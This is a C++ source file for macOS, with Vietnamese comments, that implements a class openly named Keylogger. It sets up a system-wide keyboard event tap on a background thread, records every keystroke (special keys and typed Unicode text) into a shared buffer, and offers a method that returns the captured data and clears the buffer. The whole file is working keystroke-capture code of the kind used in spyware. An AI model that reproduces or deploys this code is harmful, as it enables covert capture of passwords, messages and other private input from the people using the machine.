#include "KeyboardController.h"
#ifdef __APPLE__

std::string Keylogger::_buffer = "";
std::mutex Keylogger::_mtx;

Keylogger::Keylogger() : _isRunning(false) {}

Keylogger::~Keylogger() {
    Stop();
}

void Keylogger::append(const std::string& str) {
    std::lock_guard<std::mutex> lock(_mtx);
    _buffer += str;
}

// --- Callback xử lý sự kiện phím của macOS ---
CGEventRef Keylogger::CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
    if (type != kCGEventKeyDown && type != kCGEventFlagsChanged) {
        return event;
    }

    // Lấy mã phím ảo
    CGKeyCode keyCode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);

    if (keyCode == kVK_Return) append("[RETURN]");
    else if (keyCode == kVK_Tab) append("[TAB]");
    else if (keyCode == kVK_Space) append(" ");
    else if (keyCode == kVK_Delete) append("[DELETE]");
    else if (keyCode == kVK_ForwardDelete) append("[DEL]");
    else if (keyCode == kVK_Escape) append("[ESC]");
    else if (keyCode == kVK_Command || keyCode == kVK_RightCommand) append("[CMD]");
    else if (keyCode == kVK_Shift || keyCode == kVK_RightShift) append("[SHIFT]");
    else if (keyCode == kVK_CapsLock) append("[CAPS]");
    else if (keyCode == kVK_Option || keyCode == kVK_RightOption) append("[OPT]");
    else if (keyCode == kVK_Control || keyCode == kVK_RightControl) append("[CTRL]");
    else if (keyCode == kVK_LeftArrow) append("[LEFT]");
    else if (keyCode == kVK_RightArrow) append("[RIGHT]");
    else if (keyCode == kVK_UpArrow) append("[UP]");
    else if (keyCode == kVK_DownArrow) append("[DOWN]");
    else if (keyCode == kVK_Home) append("[HOME]");
    else if (keyCode == kVK_End) append("[END]");
    else if (keyCode == kVK_PageUp) append("[PGUP]");
    else if (keyCode == kVK_PageDown) append("[PGDN]");
    else if (keyCode == kVK_Help) append("[INS]");
    else if (keyCode == kVK_F1) append("[F1]");
    else if (keyCode == kVK_F2) append("[F2]");
    else if (keyCode == kVK_F3) append("[F3]");
    else if (keyCode == kVK_F4) append("[F4]");
    else if (keyCode == kVK_F5) append("[F5]");
    else if (keyCode == kVK_F6) append("[F6]");
    else if (keyCode == kVK_F7) append("[F7]");
    else if (keyCode == kVK_F8) append("[F8]");
    else if (keyCode == kVK_F9) append("[F9]");
    else if (keyCode == kVK_F10) append("[F10]");
    else if (keyCode == kVK_F11) append("[F11]");
    else if (keyCode == kVK_F12) append("[F12]");
    else if (keyCode == kVK_F13) append("[F13]");
    else if (keyCode == kVK_F14) append("[F14]");
    else if (keyCode == kVK_F15) append("[F15]");
    else if (keyCode == kVK_ANSI_KeypadClear) append("[NUMLOCK]");
    else {
        UniChar unicodeString[4];
        UniCharCount actualStringLength = 0;
        
        CGEventKeyboardGetUnicodeString(event, 4, &actualStringLength, unicodeString);
        
        if (actualStringLength > 0) {
            std::string s;
            for (int i = 0; i < actualStringLength; ++i) {
                UniChar uc = unicodeString[i];
                if (uc < 0x80) {
                    s += (char)uc;
                } else if (uc < 0x800) {
                    s += (char)(0xC0 | (uc >> 6));
                    s += (char)(0x80 | (uc & 0x3F));
                } else {
                    s += (char)(0xE0 | (uc >> 12));
                    s += (char)(0x80 | ((uc >> 6) & 0x3F));
                    s += (char)(0x80 | (uc & 0x3F));
                }
            }
            if (!s.empty()) {
                append(s);
            } else {
                append("[" + std::to_string(keyCode) + "]");
            }
        } else {
            append("[" + std::to_string(keyCode) + "]");
        }
    }

    return event;
}

void Keylogger::MacLoop() {
    CGEventMask eventMask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);
    
    eventTap = CGEventTapCreate(
        kCGSessionEventTap, 
        kCGHeadInsertEventTap, 
        kCGEventTapOptionDefault, 
        eventMask, 
        CGEventCallback, 
        nullptr
    );

    if (!eventTap) {
        fprintf(stderr, "[Keylogger] Failed to create event tap. Check Accessibility Permissions!\n");
        fprintf(stderr, "[Keylogger] Go to System Preferences > Security & Privacy > Accessibility\n");
        _isRunning = false;
        return;
    }

    runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
    if (!runLoopSource) {
        fprintf(stderr, "[Keylogger] Failed to create run loop source\n");
        CFRelease(eventTap);
        eventTap = nullptr;
        _isRunning = false;
        return;
    }
    
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
    
    CGEventTapEnable(eventTap, true);
    CFRunLoopRun();
    if (runLoopSource) {
        CFRunLoopRemoveSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
    }
}

void Keylogger::Start() {
    if (_isRunning) return;
    _isRunning = true;

    _workerThread = std::thread([this]() {
        this->MacLoop();
    });
}

void Keylogger::Stop() {
    if (!_isRunning) return;
    _isRunning = false;

    if (eventTap) {
        CGEventTapEnable(eventTap, false);
        CFMachPortInvalidate(eventTap);
        CFRelease(eventTap);
        eventTap = nullptr;
    }

    if (runLoopSource) {
        CFRunLoopSourceInvalidate(runLoopSource);
        CFRelease(runLoopSource);
        runLoopSource = nullptr;
    }
    
    if (_workerThread.joinable()) {
        _workerThread.join();
    }
}

std::string Keylogger::getDataAndClear() {
    std::lock_guard<std::mutex> lock(_mtx);
    if (_buffer.empty()) return "";
    std::string dataCopy = _buffer;
    _buffer.clear();
    return dataCopy;
}

#endif